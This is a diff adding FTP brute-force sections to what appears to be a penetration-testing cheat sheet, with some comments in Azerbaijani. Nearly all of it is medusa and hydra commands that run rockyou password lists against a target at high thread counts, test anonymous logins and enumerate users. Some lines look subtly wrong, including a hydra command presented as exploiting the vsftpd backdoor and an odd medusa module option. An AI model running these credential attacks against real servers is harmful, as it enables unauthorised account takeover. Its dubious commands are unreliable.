@@ -18,6 +18,35 @@ nmap -sS -sV -sC -p- --script banner,ftp-* -oN ftp_deep.txt <target_ip>
 ## Brute force
 
 ```bash
+# User/pass enum (rockyou + custom)
+medusa -h <target_ip> -u admin -p /usr/share/wordlists/rockyou.txt -M ftp -t 50 -T 100 -f -F -r 3
+
+# Userlist + passlist (ftp_users.txt yaradın: admin,ftpuser,guest,root)
+medusa -h <target_ip> -U /path/to/ftp_users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -t 100 -m DIR:/etc/passwd
+
+# Anonymous + weak creds test
+medusa -h <target_ip> -u anonymous -p "-" -M ftp  # "-" blank pass
+```
+
+# Hydra
+
+## Brute Force
+
+```bash
+# Basic brute
+hydra -L /usr/share/wordlists/dirb/common.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_ip> -t 64 -w 10 -vV
+
+# Anonymous test + timeout
+hydra -l anonymous -p "" ftp://<target_ip>/ -t 128 -W 5
+
+# User enum (error diff ilə)
+hydra -L ftp_users.txt -p testpass ftp://<target_ip> -t 200 -f -V  # -f ilk success-də dayandır
+
+# Custom module ilə (vsftpd backdoor)
+hydra -l ":)" -p any ftp://<target_ip>  # Backdoor user
+```
+
+
 
 
 
